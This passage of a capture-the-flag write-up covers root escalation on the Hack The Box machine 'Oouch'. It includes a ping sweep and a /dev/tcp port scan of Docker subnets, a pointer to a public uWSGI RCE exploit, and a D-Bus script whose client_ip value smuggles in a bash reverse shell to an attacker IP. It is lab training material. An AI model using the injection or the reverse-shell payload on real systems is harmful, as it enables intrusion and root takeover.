+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;!-- -*- XML -*- --&gt;
+
+&lt;!DOCTYPE busconfig PUBLIC
+ &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
+ &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;
+
+&lt;busconfig&gt;
+
+    &lt;policy user=&#34;root&#34;&gt;
+        &lt;allow own=&#34;htb.oouch.Block&#34;/&gt;
+    &lt;/policy&gt;
+
+        &lt;policy user=&#34;www-data&#34;&gt;
+                &lt;allow send_destination=&#34;htb.oouch.Block&#34;/&gt;
+                &lt;allow receive_sender=&#34;htb.oouch.Block&#34;/&gt;
+        &lt;/policy&gt;
+
+&lt;/busconfig&gt;
+</code></pre>
+  </div>
+
+
+<p>This tells us that the root user owns this service (running as root) and also that <code>www-data</code> is allowed to send and receive messages to and from this service.</p>
+<p>When we try to look for the website&rsquo;s root directory we cannot find it on the host, <code>/var/www</code> doesn&rsquo;t exist.</p>
+<p>Looking at the different network interfaces, we see that there might docker containers running on the host:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/docker_subnets.png"   />
+    
+      <figcaption class="center" >Docker subnets</figcaption>
+    
+  </figure>
+
+
+<p>We can use this bash oneliner to do a ping sweep on the different subnets:</p>
+<blockquote>
+<p>Since docker assigns IPs from the beginning, we can just ping the first 10</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>1..10<span class="o">}</span><span class="p">;</span><span class="k">do</span> ping -c <span class="m">1</span> -W <span class="m">1</span> 172.18.0.<span class="nv">$i</span> &gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;172.18.0.</span><span class="nv">$i</span><span class="s2">: up&#34;</span><span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></div>
+  <figure class="center" >
+    <img src="/img/htb/oouch/ping_sweep_results.png"   />
+    
+      <figcaption class="center" >Ping sweep results</figcaption>
+    
+  </figure>
+
+
+<p>We see that 2,3,4 and 5 are up. Let&rsquo;s see which one is running the website on <code>:5000</code>. For that we can use this command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>2..5<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> &gt; /dev/tcp/172.18.0.<span class="nv">$i</span>/5000 <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;172.18.0.</span><span class="nv">$i</span><span class="s2">:5000 open&#34;</span><span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></div>
+  <figure class="center" >
+    <img src="/img/htb/oouch/5000_pscan.png"   />
+    
+      <figcaption class="center" >:5000 port scan results</figcaption>
+    
+  </figure>
+
+
+<p>We see that port 5000 is opened on <code>172.18.0.4</code>, which means it&rsquo;s probably the container that is running the consumer website. We also notice that port 22 is also opened:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/ssh_port_open_docker.png"   />
+    
+      <figcaption class="center" >Port 22 also opened</figcaption>
+    
+  </figure>
+
+
+<p>We can directly ssh into the container with our user <code>qtc</code>:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/ssh_docker.png"   />
+    
+      <figcaption class="center" >SSH access in docker container</figcaption>
+    
+  </figure>
+
+
+<p>Looking around the filesystem, we see a <code>/code</code> directory:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/code_directory.png"   />
+    
+      <figcaption class="center" >/code directory</figcaption>
+    
+  </figure>
+
+
+<p>In <code>/code/oouch/routes.py</code>, this part catches our attention:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="815794236" type="checkbox"  />
+    <label for="815794236">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">/code/oouch/routes.py</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+# First apply our primitive xss filter
+        if primitive_xss.search(form.textfield.data):
+            bus = dbus.SystemBus()
+            block_object = bus.get_object(&#39;htb.oouch.Block&#39;, &#39;/htb/oouch/Block&#39;)
+            block_iface = dbus.Interface(block_object, dbus_interface=&#39;htb.oouch.Block&#39;)
+
+            client_ip = request.environ.get(&#39;REMOTE_ADDR&#39;, request.remote_addr)
+            response = block_iface.Block(client_ip)
+            bus.close()
+            return render_template(&#39;hacker.html&#39;, title=&#39;Hacker&#39;)
+</code></pre>
+  </div>
+
+
+<p>This code snippet checks if the content of the text field (the one in the contact page) contains an XSS. If so, it will call the method <code>Block()</code> from the <code>htb.oouch.Block</code> interface by passing it the client IP address as a parameter. Depending on how the <code>client_ip</code> is handle, this could lead to an injection somewhere.</p>
+<p>However we cannot test for it now since we&rsquo;re the user <code>qtc</code> and we need to be <code>www-data</code> in order to interact with that service and call the <code>Block()</code> method.</p>
+<p>Looking further in the <code>/code</code> directory, we see the <code>uwsgi.ini</code> file suggesting that the applicaiton is using uWSGI which serves as an interface between web servers (like Nginx, Apache) and Python web applications/frameworks (like Django, Flask).</p>
+<p>Searching for uwsgi exploits, we find <a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">this one</a> which is an RCE. This will likely get us a shell as <code>www-data</code>.</p>
+<blockquote>
+<p>You will need to remove &ldquo;import bytes&rdquo; on line 18</p></blockquote>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/rce_www_data.png"   />
+    
+      <figcaption class="center" >RCE as www-data</figcaption>
+    
+  </figure>
+
+
+<p>Using this we can get a reverse shell as www-data:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/www_data_revshell.png"   />
+    
+      <figcaption class="center" >Reverse shell as www-data</figcaption>
+    
+  </figure>
+
+
+<p>Now that we have a shell as <code>www-data</code>, we can use the following python script to see if there is a command injection vulnerability:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="251763489" type="checkbox"  />
+    <label for="251763489">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">Exploit script for rce in iptables through dbus</span>
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import sys
+sys.path.insert(0, &#34;/usr/lib/python3/dist-packages&#34;)
+import dbus
+
+bus = dbus.SystemBus()
+block_object = bus.get_object(&#39;htb.oouch.Block&#39;, &#39;/htb/oouch/Block&#39;)
+block_iface = dbus.Interface(block_object, dbus_interface=&#39;htb.oouch.Block&#39;)
+
+client_ip = &#39;; bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.14/1338 0&gt;&amp;1&#34; //&#39;
+response = block_iface.Block(client_ip)
+bus.close()
+</code></pre>
+  </div>
+
+
+<p>The first two lines were added to tell the script where to find the dbus package</p>
+<p>If we run it without, we&rsquo;ll get the following error:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/dbus_import_error.png"   />
+    
+      <figcaption class="center" >dbus import error</figcaption>
+    
+  </figure>
+
+
+<p>After running it, we get a shell as root and can retrieve the root flag:</p>
+
+  <figure class="center" >
+    <img src="/img/htb/oouch/root_flag.png"   />
+    
+      <figcaption class="center" >Root flag obtained !</figcaption>
+    
+  </figure>
+
+
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="//localhost:1313/posts/htb-ctf/">
+                <span class="button__text">HTB - CTF</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
